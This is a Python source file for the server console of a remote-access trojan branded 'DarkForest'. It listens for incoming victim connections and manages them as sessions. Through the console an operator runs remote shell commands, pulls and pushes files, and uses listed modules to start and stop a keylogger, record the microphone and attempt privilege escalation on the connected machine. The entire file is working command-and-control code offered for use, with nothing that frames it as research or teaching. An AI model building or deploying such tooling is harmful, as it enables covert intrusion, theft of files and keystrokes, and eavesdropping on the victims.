import argparse
import threading
import os
import sys
from remote_shell.network import listen, reliable_send, reliable_recv

# ANSI colors
RESET = "\033[0m"
GREEN = "\033[32m"
BLUE = "\033[34m"
YELLOW = "\033[33m"

BANNER = r"""
▓█████▄  ▄▄▄       ██▀███   ██ ▄█▀  █████▒▒█████   ██▀███  ▓█████   ██████ ▄▄▄█████▓
▒██▀ ██▌▒████▄    ▓██ ▒ ██▒ ██▄█▒ ▓██   ▒▒██▒  ██▒▓██ ▒ ██▒▓█   ▀ ▒██    ▒ ▓  ██▒ ▓▒
░██   █▌▒██  ▀█▄  ▓██ ░▄█ ▒▓███▄░ ▒████ ░▒██░  ██▒▓██ ░▄█ ▒▒███   ░ ▓██▄   ▒ ▓██░ ▒░
░▓█▄   ▌░██▄▄▄▄██ ▒██▀▀█▄  ▓██ █▄ ░▓█▒  ░▒██   ██░▒██▀▀█▄  ▒▓█  ▄   ▒   ██▒░ ▓██▓ ░ 
░▒████▓  ▓█   ▓██▒░██▓ ▒██▒▒██▒ █▄░▒█░   ░ ████▓▒░░██▓ ▒██▒░▒████▒▒██████▒▒  ▒██▒ ░ 
 ▒▒▓  ▒  ▒▒   ▓▒█░░ ▒▓ ░▒▓░▒ ▒▒ ▓▒ ▒ ░   ░ ▒░▒░▒░ ░ ▒▓ ░▒▓░░░ ▒░ ░▒ ▒▓▒ ▒ ░  ▒ ░░   
 ░ ▒  ▒   ▒   ▒▒ ░  ░▒ ░ ▒░░ ░▒ ▒░ ░       ░ ▒ ▒░   ░▒ ░ ▒░ ░ ░  ░░ ░▒  ░ ░    ░    
 ░ ░  ░   ░   ▒     ░░   ░ ░ ░░ ░  ░ ░   ░ ░ ░ ▒    ░░   ░    ░   ░  ░  ░    ░      
   ░          ░  ░   ░     ░  ░              ░ ░     ░        ░  ░      ░           
 ░                                                                                  
"""

sessions = {}
session_id_counter = 1
sessions_lock = threading.Lock()

def prompt_menu():
    sys.stdout.write(f"{YELLOW}darkforest> {RESET}")
    sys.stdout.flush()


def accept_connections(server_socket):
    global session_id_counter
    while True:
        conn, addr = server_socket.accept()
        with sessions_lock:
            sid = session_id_counter
            session_id_counter += 1
            sessions[sid] = {'conn': conn, 'addr': addr}
        print(f"[+] New session {sid} from {addr}")
        prompt_menu()


def print_help():
    print(f"{GREEN}Available menu commands:{RESET}")
    print(" sessions            - List active sessions")
    print(" enter <session_id>  - Interact with a session")
    print(" kill <session_id>   - Terminate a session")
    print(" clear               - Clear the screen")
    print(" help                - Show this help message")
    print(" quit                - Exit the server")
    print(f"{GREEN}\nWhen inside a session, type 'help' to list shell commands and modules.{RESET}")


def print_session_help(sid, addr):
    print(f"{GREEN}Session {sid} at {addr} shell commands:{RESET}")
    print(" cd <path>           - Change directory on client")
    print(" download <file>     - Download file from client")
    print(" upload <file>       - Upload file to client")
    print(" clear               - Clear this local shell screen")
    print(" exit                - Return to main menu")
    print(f"{GREEN}\nFeature modules available within session:{RESET}")
    print(" keylogger_start     - Start keylogger on client")
    print(" keylogger_stop      - Stop keylogger and save logs to file on server")
    print(" priv_escalate       - Attempt privilege escalation on client")
    print(" record_mic <secs>   - Record microphone audio on client")
    print(" play_sound <file>   - Play .mp3 on client")


def target_communication(conn, addr, sid):
    prompt = f"{GREEN}* [{BLUE}{sid}{GREEN}] Shell~{addr}:{RESET} "
    while True:
        try:
            cmd = input(prompt).strip()
        except EOFError:
            break
        # local 
        if cmd.lower() == 'exit':
            print(f"{YELLOW}[+] Exiting session {sid} to menu{RESET}")
            break
        if cmd.lower() == 'help':
            print_session_help(sid, addr)
            continue
        if cmd == 'clear':
            os.system('clear')
            continue
        if cmd == 'keylogger_stop':
            reliable_send(conn, cmd)
            logs = reliable_recv(conn)
            filename = f"keylogs_session_{sid}.txt"
            with open(filename, 'w') as f:
                f.write(logs)
            print(f"{YELLOW}[+] Keylogger logs saved to {filename}{RESET}")
            continue
        # other
        reliable_send(conn, cmd)
        if cmd == 'quit':
            break
        elif cmd.startswith('cd '):
            result = reliable_recv(conn)
            print(result)
        elif cmd.startswith('download '):
            file_name = cmd.split(' ', 1)[1]
            from remote_shell.file_transfer import download
            download(conn, file_name)
            print(f"{YELLOW}[+] Downloaded {file_name}{RESET}")
        elif cmd.startswith('upload '):
            file_name = cmd.split(' ', 1)[1]
            from remote_shell.file_transfer import upload
            upload(conn, file_name)
            print(f"{YELLOW}[+] Uploaded {file_name}{RESET}")
        else:
            result = reliable_recv(conn)
            print(result)


def main():
    os.system('clear')  
    print(BANNER)
    parser = argparse.ArgumentParser()
    parser.add_argument('--host', default='0.0.0.0')
    parser.add_argument('--port', type=int, default=5555)
    args = parser.parse_args()
    server = listen(args.host, args.port)
    print(f"[+] Listening on {args.host}:{args.port}")
    threading.Thread(target=accept_connections, args=(server,), daemon=True).start()
    print_help()
    prompt_menu()
    while True:
        try:
            cmd = input().strip()
        except EOFError:
            break
        if not cmd:
            prompt_menu()
            continue
        if cmd == 'sessions':
            with sessions_lock:
                if sessions:
                    for sid, info in sessions.items():
                        print(f" {sid}: {info['addr']}")
                else:
                    print(" No active sessions")
            prompt_menu()
        elif cmd.startswith('enter '):
            sid_str = cmd.split(' ', 1)[1]
            try:
                sid = int(sid_str)
                with sessions_lock:
                    info = sessions.get(sid)
                if info:
                    print(f"{GREEN}[+] Entering session {sid}{RESET}")
                    target_communication(info['conn'], info['addr'], sid)
                    print_help()
                else:
                    print(f"{YELLOW}[!] Session {sid} not found{RESET}")
            except ValueError:
                print(f"{YELLOW}[!] Invalid session id{RESET}")
            prompt_menu()
        elif cmd.startswith('kill '):
            sid_str = cmd.split(' ', 1)[1]
            try:
                sid = int(sid_str)
                with sessions_lock:
                    info = sessions.pop(sid, None)
                if info:
                    info['conn'].close()
                    print(f"{GREEN}[+] Killed session {sid}{RESET}")
                else:
                    print(f"{YELLOW}[!] Session {sid} not found{RESET}")
            except ValueError:
                print(f"{YELLOW}[!] Invalid session id{RESET}")
            prompt_menu()
        elif cmd == 'clear':
            os.system('clear')
            prompt_menu()
        elif cmd == 'help':
            print_help()
            prompt_menu()
        elif cmd == 'quit':
            print(f"{YELLOW}[*] Shutting down.{RESET}")
            break
        else:
            print(f"{YELLOW}[!] Unknown command. Type 'help' for available commands.{RESET}")
            prompt_menu()

if __name__ == '__main__':
    main()

